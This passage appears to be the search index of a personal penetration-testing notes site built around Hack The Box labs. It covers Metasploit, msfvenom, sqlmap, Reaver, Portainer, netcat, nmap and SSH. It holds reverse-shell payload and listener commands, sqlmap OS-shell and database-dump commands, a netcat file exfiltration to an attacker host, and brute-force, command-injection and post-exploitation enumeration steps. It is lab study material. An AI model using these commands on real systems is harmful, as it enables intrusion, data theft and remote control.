</ul>"},{"location":"software/metasploit/","title":"Metasploit","text":"<p>Metasploit is a penetration testing framework that makes hacking simple. It is a powerful tool that can be used to exploit vulnerabilities in a system.</p>"},{"location":"software/metasploit/#usage","title":"Usage","text":"<p>To use Metasploit, you need to start the Metasploit console by running the following command:</p> <pre><code>msfconsole\n</code></pre> <p>Once you have started the Metasploit console, you can use the <code>search</code> command to search for exploits, payloads, and other modules. For example, to search for exploits that target a specific service, you can run the following command:</p> <pre><code>search &lt;service&gt;\n\nmsf6 &gt; search OpenSSL\n\nMatching Modules\n================\n\n   #   Name                                                  Disclosure Date  Rank       Check  Description\n   -   ----                                                  ---------------  ----       -----  -----------\n   0   payload/bsd/x86/exec                                                   normal     No     BSD Execute Command\n   1   payload/osx/x86/exec                                                   normal     No     OS X Execute Command\n   2   auxiliary/server/openssl_altchainsforgery_mitm_proxy  2015-07-09       normal     No     OpenSSL Alternative Chains Certificate Forgery MITM Proxy\n   3   auxiliary/dos/ssl/dtls_changecipherspec               2000-04-26       normal     No     OpenSSL DTLS ChangeCipherSpec Remote DoS\n   4   auxiliary/dos/ssl/dtls_fragment_overflow              2014-06-05       normal     No     OpenSSL DTLS Fragment Buffer Overflow DoS\n   5   auxiliary/server/openssl_heartbeat_client_memory      2014-04-07       normal     No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure\n   6   auxiliary/scanner/ssl/openssl_heartbleed              2014-04-07       normal     Yes    OpenSSL Heartbeat (Heartbleed) Information Leak\n   7   auxiliary/scanner/ssl/openssl_ccs                     2014-06-05       normal     No     OpenSSL Server-Side ChangeCipherSpec Injection Scanner\n   8   auxiliary/dos/ssl/openssl_aesni                       2013-02-05       normal     No     OpenSSL TLS 1.1 and 1.2 AES-NI DoS\n   9   exploit/unix/misc/polycom_hdx_traceroute_exec         2017-11-12       excellent  Yes    Polycom Shell HDX Series Traceroute Command Execution\n   10  auxiliary/scanner/ssl/ssl_version                     2014-10-14       normal     No     SSL/TLS Version Detection\n   11  payload/cmd/unix/reverse_openssl                                       normal     No     Unix Command Shell, Double Reverse TCP SSL (openssl)\n\n\nInteract with a module by name or index. For example info 11, use 11 or use payload/cmd/unix/reverse_openssl\n</code></pre> <p>To use an exploit, you can use the <code>use</code> command followed by the name or index of the exploit. For example, to use the <code>exploit/unix/misc/polycom_hdx_traceroute_exec</code> exploit, you can run the following command:</p> <pre><code>msf6 &gt; use exploit/unix/misc/polycom_hdx_traceroute_exec \n[*] Using configured payload cmd/unix/reverse\nmsf6 exploit(unix/misc/polycom_hdx_traceroute_exec) &gt; options\n\nModule options (exploit/unix/misc/polycom_hdx_traceroute_exec):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   CBHOST                     no        The listener address used for staging the final payload\n   CBPORT                     no        The listener port used for staging the final payload\n   PASSWORD                   no        Password to access console interface if required.\n   RHOSTS                     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html\n   RPORT     23               yes       The target port (TCP)\n\n\nPayload options (cmd/unix/reverse):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\n\nView the full module info with the info, or info -d command.\n</code></pre> <p>Using options as we can see above, we can set the required options for the exploit. To set an option, you can use the <code>set</code> command followed by the option name and value. For example, to set the <code>RHOSTS</code> option to `</p> <pre><code>msf6 exploit(unix/misc/polycom_hdx_traceroute_exec) &gt; set RHOSTS 10.10.11.3\nRHOSTS =&gt; 10.10.11.3\n</code></pre> <p>Then to run the exploit, you can use the <code>run</code></p>"},{"location":"software/metasploit/#reverse-shell","title":"Reverse Shell","text":"<p>If we can upload a file to the target machine, we can upload a reverse shell.</p> <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f aspx &gt; devel.aspx\n</code></pre> <p>Then we can use the <code>exploit/multi/handler</code> module to listen for the incoming connection.</p> <pre><code>use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST MACHINE_IP\nset LPORT 4444\nrun\n</code></pre> <p>Then we can navigate to the <code>devel.aspx</code> file on the target machine to get a reverse shell.</p> <pre><code>curl http://10.10.10.5/devel.aspx\n</code></pre> <p>And now in the metaexploit console we should see the following:</p> <pre><code>[*] Sending stage (175174 bytes) to\n[*] Meterpreter session 1 opened\n\nmeterpreter &gt; sessions -i 1\n</code></pre>"},{"location":"software/metasploit/#meterpreter","title":"Meterpreter","text":"<p>Once we have a reverse shell, we can use the Meterpreter shell to interact with the target machine. We can use the following commands to interact with the Meterpreter shell:</p> <ul> <li><code>sysinfo</code>: Get system information</li> <li><code>getuid</code>: Get the user that the process is running as</li> </ul>"},{"location":"software/nikto/","title":"Nikto","text":"<p>Nikto is a web server scanner that tests web servers for dangerous files/CGIs, outdated server software, and other problems. It performs generic and server type specific checks. It also captures and prints any cookies received.</p>"},{"location":"software/nikto/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/sullo/nikto\n# Main script is in program/\ncd nikto/program\n</code></pre>"},{"location":"software/nikto/#usage","title":"Usage","text":"<pre><code># Run using the shebang interpreter\n./nikto.pl -h http://10.13.38.11\n+ Target IP:          10.13.38.11\n+ Target Hostname:    10.13.38.11\n+ Target Port:        80\n+ Start Time:         2024-05-18 20:35:04 (GMT-3)\n---------------------------------------------------------------------------\n+ Server: Microsoft-IIS/10.0\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ No CGI Directories found (use '-C all' to force check all possible dirs)\n+ OPTIONS: Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .\n+ OPTIONS: Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST .\n+ No creds found for realm 'COMPATIBILITY'\n+ /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-1446\n2+ 8254 requests: 0 error(s) and 4 item(s) reported on remote host\n+ End Time:           2024-05-18 21:07:39 (GMT-3) (1955 seconds)\n</code></pre>"},{"location":"software/portainer/","title":"Portainer","text":"<p>Portainer is a lightweight management UI which allows you to easily manage your Docker host or Swarm cluster.</p>"},{"location":"software/portainer/#abuse-creation-of-an-image","title":"Abuse creation of an Image","text":"<p>We can abuse the creation of images in Portainer to read certain files on the Host.</p> <p>Using the <code>WORKDIR</code> instruction in a Dockerfile, we can traverse the filesystem and read files.</p> <pre><code>FROM ubuntu:latest\n\nWORKDIR /proc/self/fd/8\n\nRUN cat ../../../../root/root.txt\n</code></pre>"},{"location":"software/reaver/","title":"Reaver","text":"<p>Reaver is a WPA/WPA2 brute force attack tool developed by Tactical Network Solutions. It exploits a vulnerability in the WPS (Wi-Fi Protected Setup) protocol found in WPA/WPA2 wireless access points.</p>"},{"location":"software/reaver/#usage","title":"Usage","text":"<pre><code>reaver -i &lt;interface&gt; -b &lt;access-point&gt; -v\n</code></pre> <p>To obtain the interface and access point, use the following commands:</p> <pre><code>iwconfig\niwlist &lt;interface&gt; scan\n</code></pre> <p><code>Address</code> is what we are going to use in the <code>-b</code> flag.</p> <pre><code>./reaver -i wlan0 -b 02:00:00:00:01:00 -v\n\nReaver v1.6.4 WiFi Protected Setup Attack Tool\nCopyright (c) 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;\n\n[+] Waiting for beacon from 02:00:00:00:01:00\n[+] Received beacon from 02:00:00:00:01:00\n[+] Trying pin \"12345670\"\n[!] Found packet with bad FCS, skipping...\n[+] Associated with 02:00:00:00:01:00 (ESSID: ID)\n[+] WPS PIN: '12345670'\n[+] WPA PSK: 'PASSWORD'\n[+] AP SSID: 'ID'\n</code></pre>"},{"location":"software/samba/","title":"Samba","text":"<p>Samba is a free software re-implementation of the SMB/CIFS networking protocol. It allows file and print sharing between computers running Microsoft Windows and computers running Unix-like operating systems.</p> <p>Ports: 139, 445</p>"},{"location":"software/samba/#smbclient","title":"smbclient","text":"<p>docs</p> <pre><code>smbclient \\\\\\\\&lt;target-ip&gt;\\\\&lt;share-name&gt;\n</code></pre>"},{"location":"software/searchsploit/","title":"Searchsploit","text":"<p>Searchsploit is a command line search tool for Exploit Database that also allows you to take a look at the exploit details. It is a part of the Exploit Database project.</p> <pre><code>searchsploit &lt;search_term&gt;\n</code></pre>"},{"location":"software/searchsploit/#example","title":"Example","text":"<pre><code>searchsploit elastix\n</code></pre> <p>Then you can use</p> <pre><code>searchsploit -x php/webapps/37637.sh &gt;&gt; 37637.pl\nperl 37637.pl\n</code></pre>"},{"location":"software/sqlmap/","title":"Sqlmap","text":"<p>Sqlmap is a tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.</p>"},{"location":"software/sqlmap/#blind-sql-injection","title":"Blind SQL injection","text":"<p>We can inject SQL code but not see the output.</p> <pre><code>sqlmap -u \"ws://soc-player.soccer.htb:9091\" --data '{\"id\": \"*\"}' --dbs --threads 10 --\nlevel 5 --risk 3 --batch\n</code></pre> <ul> <li><code>-u</code> Target URL</li> <li><code>--data</code> Data string to be sent through POST (e.g. \"id=1\")</li> <li><code>--dbs</code> Enumerate DBMS databases</li> <li><code>--threads</code> Max number of concurrent HTTP(s) requests (default 1)</li> <li><code>--level</code> Level of tests to perform (1-5, default 1)</li> <li><code>--risk</code> Risk of tests to perform (1-3, default 1)</li> <li><code>--batch</code> Never ask for user input, use the default behavior</li> </ul> <p>If we found a DB we can dump its content with:</p> <pre><code>sqlmap -u &lt;URL&gt; --data '{\"&lt;FIELD&gt;\": \"*\" }' --threads &lt;NUMBER&gt; -D &lt;database_name&gt; --dump --batch\n</code></pre> <ul> <li><code>D</code> DBMS database to enumerate</li> <li><code>--dump</code> Dump DBMS database table entries</li> </ul> <p>To obtain a reverse shell we can use:</p> <pre><code>sqlmap -u &lt;URL&gt; --data '{\"&lt;FIELD&gt;\": \"*\" }' --threads &lt;NUMBER&gt; --os-shell --batch\n</code></pre> <p>More examples</p> <pre><code>sqlmap -D usage_blog --threads 10 -T admin_users,users -C username,password --batch --dump -r ~/Documents/Proyectos/hack-the-box/machines/usage/req_password --ignore-code 401\n</code></pre> <p>Where:</p> <ul> <li><code>-D</code> DBMS database to enumerate</li> <li><code>-T</code> DBMS database tables to enumerate</li> <li><code>-C</code> DBMS database table columns to enumerate</li> </ul> <p>And we can use a request file to avoid the need of the URL:</p> <pre><code>sqlmap -r &lt;request_file&gt; --threads &lt;NUMBER&gt; --os-shell --batch\n</code></pre> <p>A request file would look something like this:</p> <pre><code>POST /dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1\nHost: www.securewebinc.jet\nContent-Length: 25\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://www.securewebinc.jet\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-US,en;q=0.9\nCookie: PHPSESSID=2jn4imainfddc3vatcddfoafg5\nConnection: close\n\nusername=admin&amp;password=a\n</code></pre>"},{"location":"software/sqlmap/#docs","title":"Docs","text":"<ul> <li>https://github.com/sqlmapproject/sqlmap/wiki/Usage</li> </ul>"},{"location":"software/tmux/","title":"Tmux","text":"<p>Tmux is a terminal multiplexer. It allows you to create multiple terminal sessions in a single window.</p>"},{"location":"software/tmux/#use-session","title":"Use session","text":"<pre><code>tmux -S &lt;session_name&gt;\n</code></pre>"},{"location":"software/tmux/#cheat-sheet","title":"Cheat Sheet","text":"<ul> <li>tmux-cheat-sheet</li> </ul>"},{"location":"software/whatweb/","title":"Whatweb","text":"<p>Whatweb is a web scanner that identifies what software is used for a website. It can recognize content management systems, blogging platforms, stats/analytics packages, JavaScript libraries, server software, and more.</p>"},{"location":"software/whatweb/#usage","title":"Usage","text":"<pre><code>whatweb &lt;URL&gt;\n</code></pre> <pre><code>whatweb jonathan.com.ar\n\nhttp://jonathan.com.ar [301 Moved Permanently] Country[UNITED STATES][US], HTTPServer[cloudflare], IP[104.21.75.180], RedirectLocation[https://jonathan.com.ar/], UncommonHeaders[report-to,nel,cf-ray,alt-svc]\n\nhttps://jonathan.com.ar/ [200 OK] Country[UNITED STATES][US], HTML5, HTTPServer[cloudflare], IP[104.21.75.180], Script, Title[/], UncommonHeaders[cf-cache-status,report-to,nel,cf-ray,alt-svc]\n</code></pre>"},{"location":"software/wireshark/","title":"Wireshark","text":"<p>Wireshark is a network protocol analyzer that can be used to capture and analyze network traffic. It is commonly used to troubleshoot network issues, monitor network activity, and analyze network security.</p>"},{"location":"software/wireshark/#cipher-in-kerberos","title":"Cipher in Kerberos","text":"<p>When analyzing network traffic with Wireshark, you may come across Kerberos authentication packets that contain a cipher. The cipher is a hash of the user's password and can be cracked to recover the plaintext password.</p> <p> </p>"},{"location":"software/wireshark/#capture-traffic","title":"Capture Traffic","text":"<p>To capture network traffic with Wireshark, follow these steps:</p> <ol> <li>Open Wireshark.</li> <li>Select the network interface you want to capture traffic on.</li> <li>Click the \"Start\" button to begin capturing traffic.</li> </ol> <p> </p>"},{"location":"software/wpscan/","title":"Wpscan","text":"<p>Wpscan is a WordPress vulnerability scanner. It is a black box scanner that scans the WordPress website for vulnerabilities within the WordPress core, plugins, and themes.</p>"},{"location":"software/wpscan/#usage","title":"Usage","text":"<pre><code>docker run -it --rm wpscanteam/wpscan --url http://10.13.37.11/ --enumerate u &gt; wpascan\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ \u00ae\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.25\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n</code></pre>"},{"location":"standards/checklist/","title":"Checklist","text":"<p>This is a checklist of steps on what you should be looking at once you are inside a machine. This is not a definitive list, but it should give you a good idea of what to look for.</p> <ol> <li>Check for sudo privileges <code>shell     sudo -l</code></li> <li>Check for environment variables <code>shell     env</code></li> <li>Check for files with <code>setuid</code> bit set <code>shell     find / -perm -4000 -type f 2&gt;/dev/null</code></li> <li>Check for logs <code>shell     cat /var/log/auth.log</code></li> <li>Check for cron jobs <code>shell     cat /etc/crontab</code></li> <li>List running processes <code>shell     ps aux</code></li> <li>Info about me <code>shell     id || (whoami &amp;&amp; groups) 2&gt;/dev/null</code></li> <li> <p>Check for writable files <code>shell     find / -writable -type f 2&gt;/dev/null</code></p> </li> <li> <p>Check for emails <code>shell     cat /var/mail/$USER</code></p> </li> <li> <p>Check for network connections <code>shell     netstat -tulnp</code></p> </li> <li> <p>Scan with <code>linpeas</code> <code>shell     ./linpeas.sh</code></p> </li> </ol>"},{"location":"standards/owasp/","title":"Owasp","text":""},{"location":"standards/owasp/#remote-code-execution","title":"Remote Code Execution","text":"<p>What is RCE?</p> <p>Remote Code Execution (RCE) is a type of vulnerability that allows an attacker to execute arbitrary code on a target server or application. This can be used to gain access to the server, steal data, or perform other malicious activities.</p>"},{"location":"standards/owasp/#htb-challenge","title":"HTB Challenge","text":"<p>https://app.hackthebox.com/challenges/177</p>"},{"location":"standards/owasp/#resolution","title":"Resolution","text":"<p>The challenge looks like this</p> <p></p> <p>We have 2 select boxes and one input, so our attention goes to the input, we can try to inject some code to see if we can get a response from the server.</p> <p>First we try to do the write box part to see how the server responds.</p> <p></p> <p>Now since this is running bash, we can try to add a <code>;</code> at the end of the <code>localhost</code> and execute another command.</p> <p></p> <p>We got confirmation that we are executing commands, now instead of <code>id</code> i'm going to find the flag with this command <code>localhost; ls / | grep -i \"flag\"</code></p> <p>At this point we should find a file called <code>flag_xxx</code></p> <p>Now we can do <code>localhost; cat &lt;name&gt;</code> to see the content of the file.</p>"},{"location":"system/bash/","title":"Bash","text":""},{"location":"system/bash/#encode-and-decode-base64","title":"Encode and decode base64","text":"<pre><code>echo \"id\" | base64\n# aWQK\necho \"aWQK\" | base64 -d | bash\nuid=1000(user)\n</code></pre>"},{"location":"system/bash/#check-if-a-file-exists","title":"Check if a file exists","text":"<pre><code>if [ -f /etc/passwd ]; then\n    echo \"File exists\"\nelse\n    echo \"File does not exist\"\nfi\n</code></pre>"},{"location":"system/bash/#find-files","title":"Find files","text":"<pre><code>find / -name \"passwd\"\n</code></pre>"},{"location":"system/bash/#find-files-by-extension","title":"Find files by extension","text":"<pre><code>find / -name \"*.txt\"\n</code></pre>"},{"location":"system/bin/","title":"GTFOBins \ud83d\udd22","text":"<p>GTFOBins</p> <p>This is a collection of <code>binaries</code> that can be used to bypass local security restrictions in misconfigured systems. </p> <pre><code>/usr/bin/journalctl -n5 -unostromo.service\n</code></pre> <pre><code>!/bin/bash\n</code></pre> <p>Pay attention because kitty has trouble with the interactive shell.</p>"},{"location":"system/common/","title":"Common","text":"<pre><code>sudo -l # Check for sudo privileges\nenv # Check for environment variables\nfind / -perm -4000 -type f 2&gt;/dev/null # Check for files with `setuid` bit set\ncat /var/log/auth.log\ncat /etc/crontab\nps aux #List running processes\nid || (whoami &amp;&amp; groups) 2&gt;/dev/null #Info about me\ncat /etc/passwd | cut -d: -f1 #List all users\ncat /etc/passwd | grep \"sh$\" #List users with console\nawk -F: '($3 == \"0\") {print}' /etc/passwd #List superusers\nw #Currently logged users\nlast | tail #Login history\nlastlog #Last log of each user\n#List all users and their groups\nfor i in $(cut -d\":\" -f1 /etc/passwd 2&gt;/dev/null);do id $i;done 2&gt;/dev/null | sort\ngpg --list-keys 2&gt;/dev/null #Current user PGP keys\ndate 2&gt;/dev/null #Date\n(df -h || lsblk) #System stats\nlscpu #CPU info\nlpstat -a 2&gt;/dev/null #Printers info\nls -al /etc/nginx/sites-enabled #Nginx sites\ndoas # Check if doas is installed\nls /usr/share/xsessions/ # check enabled desktop environments\n</code></pre>"},{"location":"system/de/","title":"Desktop Environment","text":"<p>Some desktop environments are exploitable or one of the libraries they use is.</p> <p>One example could be the <code>enlightenment</code> desktop environment. It has a vulnerability that allows an attacker to execute arbitrary code with the privileges of the user running the enlightenment desktop environment.</p>"},{"location":"system/de/#finding","title":"Finding","text":"<pre><code>dpkg -l | grep -E 'gnome|kde|xfce|lxde|enlightenment'\n</code></pre>"},{"location":"system/de/#links","title":"Links","text":"<ul> <li>https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit</li> </ul>"},{"location":"system/ftp/","title":"FTP \ud83d\udcc1","text":"<p>FTP (File Transfer Protocol) is a standard network protocol used to transfer files from one host to another host over a TCP-based network, such as the Internet.</p>"},{"location":"system/ftp/#connect-to-ftp-via-anonymous-login","title":"Connect to FTP via anonymous login","text":"<pre><code>ftp &lt;IP&gt;\n</code></pre> <p>When prompted for a username, type <code>anonymous</code> and press enter. When prompted for a password, press enter.</p> <p>Download files in the FTP server</p> <pre><code>get &lt;file&gt;\n</code></pre>"},{"location":"system/netcat/","title":"Netcat","text":"<p>Netcat is a simple Unix utility which reads and writes data across network connections, using the TCP/IP protocol.</p>"},{"location":"system/netcat/#listen-on-a-port","title":"Listen on a port","text":"<pre><code>nc -lvpn 4444\n</code></pre>"},{"location":"system/netcat/#transfer-files","title":"Transfer files","text":"<p>On your machine:</p> <pre><code>nc -lvnp 1337 &gt; backup.tar.gz\n</code></pre> <p>On the target machine:</p> <pre><code>nc 10.10.14.7 1337 &lt; backup.tar.gz\n</code></pre>"},{"location":"system/nmap/","title":"Nmap","text":"<p>Nmap is a network scanner that can be used to discover hosts and services on a computer network.</p>"},{"location":"system/nmap/#usage","title":"Usage","text":"<pre><code>nmap -p- -T4 &lt;IP&gt; -oA fullport --min-rate 5000\nsudo nmap -sU --open -T4 --top-ports 1000 -o udp 10.13.37.11\nnmap -sUCV -p161 10.13.37.11 -oN udpscan\n</code></pre> <ul> <li><code>-p-</code> : Scan all ports</li> <li><code>-T4</code> : Set the timing template to 4 (aggressive)</li> <li><code>-oA</code> : Output in all formats</li> <li><code>--min-rate</code> : Send packets at a minimum rate of 5000 per second</li> <li><code>sV</code> : Probe open ports to determine service/version info</li> <li><code>--open</code> : Only show open ports</li> </ul>"},{"location":"system/nmap/#udp","title":"UDP","text":"<pre><code>sudo nmap -sU --open -T4 --top-ports 1000 -o udp &lt;IP&gt;\n</code></pre>"},{"location":"system/nmap/#scripts-for-nmap","title":"Scripts for NMAP","text":"<pre><code>nmap --script dns-brute &lt;IP&gt;\n</code></pre> <ul> <li><code>dns-brute</code> : Brute force subdomains</li> </ul>"},{"location":"system/nmap/#vulnerability-scanning","title":"Vulnerability scanning","text":"<pre><code>nmap --script vuln -o vul &lt;IP&gt;\n</code></pre>"},{"location":"system/nmap/#location-of-nmap-scripts","title":"Location of NMAP scripts","text":"<pre><code>ls /usr/share/nmap/scripts/\n</code></pre>"},{"location":"system/nmap/#script-redis","title":"Script redis","text":"<p>https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis</p> <pre><code>nmap --script redis-info -p 6379 &lt;IP&gt;\n</code></pre>"},{"location":"system/nmap/#cheatsheet","title":"Cheatsheet","text":"<p>stationx</p>"},{"location":"system/ping/","title":"Ping","text":"<p>Ping is a simple command that checks if the bot is online and responsive.</p>"},{"location":"system/ping/#usage","title":"Usage","text":"<pre><code># Basic usage\nping 10.13.37.11\nPING 10.13.37.11 (10.13.37.11) 56(84) bytes of data.\n64 bytes from 10.13.37.11: icmp_seq=1 ttl=63 time=248 ms\n\n--- 10.13.37.11 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 247.591/247.591/247.591/0.000 ms\n# Record route\nping 10.13.37.11 -R\nPING 10.13.37.11 (10.13.37.11) 56(124) bytes of data.\n64 bytes from 10.13.37.11: icmp_seq=1 ttl=63 time=247 ms\nRR:     10.10.14.4\n        10.13.37.2\n        10.13.37.11\n        10.13.37.11\n        10.10.14.1\n        10.10.14.4\n</code></pre> <p>Where <code>icmp_seq</code> is the sequence number of the packet, <code>ttl</code> is the time to live, and <code>time</code> is the time it took for the packet to reach the destination.</p> <p>When ttl is near 64, it means a the server is a linux server. When ttl is near 128, it means the server is a windows server.</p>"},{"location":"system/ports/","title":"Ports","text":"<p>Related to ports and how to interact with them.</p>"},{"location":"system/ports/#check-open-ports","title":"Check open ports","text":"<pre><code>ss -tunl\nnetstat -tunl\n</code></pre>"},{"location":"system/ports/#port-forwarding","title":"Port forwarding","text":"<p>read</p> <pre><code>ssh -L &lt;LOCAL_PORT&gt;:&lt;REMOTE_HOST&gt;:&lt;REMOTE_PORT&gt; &lt;USER&gt;@&lt;GATEWAY&gt;\nssh -L 1111:127.0.0.1:8080 matthew@surveillance.htb\n</code></pre>"},{"location":"system/ports/#dump-traffic","title":"Dump traffic","text":"<p>Here is an example of how to dump ICMP traffic on a specific interface, this can be used if we want to ping against our machine if we are running a XSS attack and test if the payload is working.</p> <pre><code>tcpdump -i tun0 -n icmp\n</code></pre> <p>Where each flag means:</p> <ul> <li><code>-i</code> Listen on interface.</li> <li><code>tun0</code> The interface to listen on.</li> <li><code>-n</code> Don't convert addresses (i.e., host addresses, port numbers, etc.) to names.</li> <li><code>icmp</code> Capture only ICMP traffic.</li> </ul>"},{"location":"system/ports/#161-snmp","title":"161 SNMP","text":"<p>SNMP is a protocol that allows for the monitoring of network-attached devices. It is commonly used to gather information about network devices, such as routers, switches, and servers.</p>"},{"location":"system/ports/#enumeration","title":"Enumeration","text":"<pre><code>snmpwalk -c &lt;COMMUNITY_STRING&gt; &lt;VERSION&gt; &lt;IP&gt;\nsnmpwalk -c public -v1 10.13.37.11\nsnmpbulkwalk -c public -v1 10.13.37.11\n</code></pre> <p>Where each flag means:</p> <ul> <li><code>-c</code> Community string.</li> <li><code>public</code> Common community string.</li> <li><code>-v</code> SNMP version.</li> <li><code>1</code> SNMP version 1.</li> </ul> <p>To obtain the community string, we can use the following command:</p> <pre><code>python3 snmpbrute.py -t 10.13.37.11 -f ~/Documents/Security/wordlists/common-snmp-community-strings-onesixtyone.txt\nonesixtyone -c &lt;WORDLIST&gt; &lt;IP&gt;\nonesixtyone -c /usr/share/wordlists/common-snmp-community-strings-onesixtyone.txt\nScanning 1 hosts, 121 communities\n10.13.37.11 [public] Linux Leakage 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64\n10.13.37.11 [public] Linux Leakage 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64\n</code></pre>"},{"location":"system/rsync/","title":"Rsync","text":"<p>Rsync is a fast and versatile file copying tool that can be used to copy files from one host to another. It is a powerful tool that can be used to synchronize files between two directories, or to copy files from one host to another. Rsync is a great tool for backing up files, and it can be used to copy files from one host to another over a network.</p>"},{"location":"system/rsync/#default-port","title":"Default PORT","text":"<p>Rsync uses port 873 by default.</p>"},{"location":"system/rsync/#anonymous-rsync","title":"Anonymous rsync","text":"<pre><code>rsync --list-only 10.129.136.195::\n</code></pre>"},{"location":"system/rsync/#download-files","title":"Download files","text":"<pre><code>rsync 10.129.136.195::public/file.txt file.txt\n</code></pre>"},{"location":"system/socat/","title":"Socat","text":"<p>Socat is a command line based utility that establishes two bidirectional byte streams and transfers data between them. Because of its versatility and ease of use, it is often used to create network connections between systems.</p>"},{"location":"system/socat/#usage","title":"Usage","text":"<p>In the target machine</p> <pre><code>socat TCP-LISTEN:&lt;PORT&gt;,reuseaddr,fork EXEC:&lt;BINARY&gt; &amp; \n</code></pre> <p>Where:</p> <ul> <li><code>TCP-LISTEN</code> is the type of connection to create.</li> <li><code>&lt;PORT&gt;</code> is the port number to expose.</li> <li><code>reuseaddr</code> allows the port to be reused.</li> <li><code>fork</code> allows the connection to be forked.</li> <li><code>EXEC:&lt;BINARY&gt;</code> is the binary to execute.</li> <li><code>&amp;</code> runs the command in the background.</li> </ul> <p>In your machine</p> <pre><code>nc &lt;IP&gt; &lt;PORT&gt;\n</code></pre>"},{"location":"system/ssh/","title":"SSH","text":"<p>SSH (Secure Shell) is a network protocol that allows secure communication between two computers. It is used to log into a remote machine and execute commands.</p>"},{"location":"system/ssh/#create-a-reverse-tunnel","title":"Create a reverse tunnel","text":"<pre><code>ssh -R 80:localhost:6969 nokey@localhost.run\n</code></pre>"},{"location":"system/ssh/#connect-via-ssh","title":"Connect via ssh","text":"<pre><code>ssh user@&lt;IP&gt;\n</code></pre>"},{"location":"system/ssh/#convert-putty-to-openssh","title":"Convert putty to openssh","text":"<pre><code>sudo apt install putty-tools\nputtygen putty.ppk -O private-openssh -o id_rsa\nchmod 600 id_rsa\n</code></pre>"},{"location":"system/ssh/#bruteforce","title":"Bruteforce","text":"<ul> <li>ssb</li> <li>hydra</li> </ul>"},{"location":"system/ssh/#known-username","title":"Known Username","text":"<pre><code>ssb -p &lt;PORT&gt; -w &lt;WORDLIST&gt; &lt;USER&gt;@&lt;IP&gt;\nhydra -l &lt;USER&gt; -t &lt;THREADS&gt; -P &lt;WORDLIST&gt; ssh://&lt;IP&gt;\n</code></pre>"},{"location":"system/ssh/#private-key","title":"Private Key","text":"<pre><code>ssh -i id_rsa &lt;USER&gt;@&lt;IP&gt;\n</code></pre>"},{"location":"system/ssh/#identitiesonly","title":"IdentitiesOnly","text":"<pre><code>ssh -o IdentitiesOnly=yes -i id_rsa &lt;USER&gt;@&lt;IP&gt;\n</code></pre>"},{"location":"system/ssh/#crack-private-key","title":"Crack Private Key","text":"<p>ssh2john</p> <pre><code>ssh2john id_rsa &gt; id_rsa.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash\n</code></pre>"},{"location":"system/strace/","title":"Strace","text":"<p>Strace is a diagnostic, debugging and instructional userspace utility for Linux.</p>"},{"location":"system/strace/#usage","title":"Usage","text":"<pre><code>strace mks\nexecve(\"/usr/local/bin/mks\", [\"mks\"], 0x7fffec0e73b0 /* 100 vars */) = 0\nprlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0\nprlimit64(0, RLIMIT_STACK, {rlim_cur=16384*1024, rlim_max=RLIM64_INFINITY}, NULL) = 0\nrt_sigaction(SIGSEGV, {sa_handler=0x1006630, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART|SA_RESETHAND|SA_SIGINFO, sa_restorer=0x10073b0}, NULL, 8) = 0\nrt_sigaction(SIGILL, {sa_handler=0x1006630, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART|SA_RESETHAND|SA_SIGINFO, sa_restorer=0x10073b0}, NULL, 8) = 0\nrt_sigaction(SIGBUS, {sa_handler=0x1006630, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART|SA_RESETHAND|SA_SIGINFO, sa_restorer=0x10073b0}, NULL, 8) = 0\nrt_sigaction(SIGFPE, {sa_handler=0x1006630, sa_mask=[], 